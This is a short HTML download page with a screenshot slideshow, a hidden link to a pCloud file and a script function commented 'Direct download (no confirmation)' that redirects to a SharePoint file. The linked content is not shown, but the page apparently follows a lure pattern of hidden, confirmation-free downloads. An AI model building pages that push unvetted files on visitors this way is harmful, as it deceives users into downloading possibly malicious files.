<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download Page</title>
  <style>
    /* Optional: style for screenshot slideshow */
    .screenshots img { display: none; }
    .screenshots img.active { display: block; }
  </style>
</head>
<body>

  <!-- Hidden Download Link -->
  <a id="downloadLink" href="https://u.pcloud.link/publink/show?code=XZlB5b5ZurrkvvDGeM5PFGUNV8l6GYvb2nQy" style="display:none;" download></a>

  <!-- Screenshot Slideshow -->
  <div class="screenshots">
    <img src="img1.jpg" class="active" />
    <img src="img2.jpg" />
    <img src="img3.jpg" />
  </div>

  <!-- Scripts -->
  <script>
    // Screenshot slideshow
    const screenshots = document.querySelectorAll('.screenshots img');
    let current = 0;

    setInterval(() => {
      screenshots[current].classList.remove('active');
      current = (current + 1) % screenshots.length;
      screenshots[current].classList.add('active');
    }, 5000);

    // Direct download (no confirmation)
    function confirmDownload() {
      window.location.href = "https://madhyabindu-my.sharepoint.com/:u:/g/personal/dinesh_ranamagar_madhyabindu_edu_np/ETai2FIdVi9Nkq9jwKl-i_0BGVNOwROkPjywzwzxQE_B-A?e=i6oLd8";
    }
  </script>

</body>
</html>
